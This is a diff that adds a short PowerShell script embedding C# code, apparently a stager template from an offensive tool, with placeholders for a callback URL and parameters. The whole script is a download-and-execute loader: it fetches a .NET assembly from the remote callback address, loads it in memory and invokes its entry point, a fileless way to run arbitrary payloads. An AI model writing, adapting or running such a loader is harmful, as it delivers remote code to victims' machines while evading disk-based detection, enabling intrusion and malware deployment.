@@ -1,0 +1,41 @@
+$type = @"
+using System;
+using System.IO;
+using System.Net;
+using System.Reflection;
+
+public class Run
+{
+    public static void go()
+    {
+        try
+        {
+            string url = "[[[[callbackURL]]]]";
+
+            WebClient client = new WebClient();
+
+            byte[] executableBytes = client.DownloadData(url);
+            Assembly assembly = Assembly.Load(executableBytes);
+            MethodInfo entryPoint = assembly.EntryPoint;
+            if (entryPoint != null)
+            {
+                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[] { [[[[parameters]]]] } };
+                entryPoint.Invoke(null, parameters);
+            }
+            else
+            {
+                Console.WriteLine("The loaded assembly does not have an entry point.");
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("An exception occured: " + ex.Message);
+        }
+
+    }
+}
+"@
+
+add-type $type
+
+[Run]::go()
